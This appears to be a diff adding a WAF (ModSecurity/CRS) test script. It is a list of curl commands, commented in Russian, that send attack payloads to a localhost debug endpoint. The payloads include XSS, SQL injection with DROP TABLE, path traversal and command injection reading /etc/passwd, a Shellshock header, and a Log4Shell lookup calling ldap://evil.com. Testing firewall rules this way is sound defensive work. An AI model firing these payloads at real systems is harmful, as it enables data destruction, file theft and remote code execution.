@@ -1,0 +1,51 @@
+# 1. Классический XSS (очень часто блокируется)
+curl.exe "http://localhost/debug/?q=<script>alert(1)</script>"
+curl.exe "http://localhost/debug/?q=<img src=x onerror=alert(1)>"
+curl.exe -G "http://localhost/debug/" --data-urlencode "q=<svg/onload=alert(1)>"
+
+# 2. SQL-инъекции (самые популярные тесты)
+curl.exe "http://localhost/debug/?id=1' OR '1'='1"
+curl.exe "http://localhost/debug/?id=1 union select 1,2,3--"
+curl.exe "http://localhost/debug/?id=1; DROP TABLE users--"
+curl.exe "http://localhost/debug/?id=-1/**/OR/**/1=1"
+
+# 3. Path traversal / LFI
+curl.exe "http://localhost/debug/?file=../../../../etc/passwd"
+curl.exe "http://localhost/debug/?page=../../../etc/passwd%00"
+curl.exe "http://localhost/debug/../../../../../etc/passwd"
+
+# 4. Command injection / RCE-подобные попытки
+curl.exe "http://localhost/debug/?cmd=;cat+/etc/passwd"
+curl.exe "http://localhost/debug/?p=|whoami"
+curl.exe "http://localhost/debug/?ip=127.0.0.1;id"
+
+# 5. Java / Spring4Shell / Log4Shell-подобные (CRS часто ловит)
+curl.exe "http://localhost/debug/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=test"
+curl.exe "http://localhost/debug/?jndi=${jndi:ldap://evil.com/a}"
+
+# 6. Очень простые, но часто срабатывающие тесты
+curl.exe "http://localhost/debug/?test=1 or sleep(5)"
+curl.exe "http://localhost/debug/?a=../../"
+curl.exe -H "User-Agent: () { :;}; /bin/bash -c 'echo vulnerable'" "http://localhost/debug/"
+
+# 7. POST-атаки (очень важно тестировать body)
+# SQLi в теле POST
+curl.exe -X POST "http://localhost/debug/" -d "username=admin' OR '1'='1&password=test"
+
+# JSON SQLi (ModSecurity должен уметь парсить JSON)
+curl.exe -X POST "http://localhost/debug/" -H "Content-Type: application/json" -d '{"id": "1; DROP TABLE users --"}'
+
+# XSS в теле POST
+curl.exe -X POST "http://localhost/debug/" -d "text=<script>alert(document.cookie)</script>"
+
+# 8. Закодированные / обфусцированные варианты (проверяют декодирование)
+curl.exe "http://localhost/debug/?q=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"
+curl.exe "http://localhost/debug/?id=1%20uNiOn%20sElEcT%201,2,3--"
+
+# 9. Тест на срабатывание конкретного правила (часто 942100, 981173 и т.д.)
+curl.exe "http://localhost/debug/?test=1/**/union/**/select/**/1,2,3"
+curl.exe -H "User-Agent: Mozilla/5.0 (compatible; sqlmap/1.0)" "http://localhost/debug/"
+
+# 10. Проверка на блокировку больших/странных заголовков
+curl.exe -H "X-Forwarded-For: 127.0.0.1, evil.com" "http://localhost/debug/"
+curl.exe -H "Referer: http://evil.com/<script>alert(1)</script>" "http://localhost/debug/"
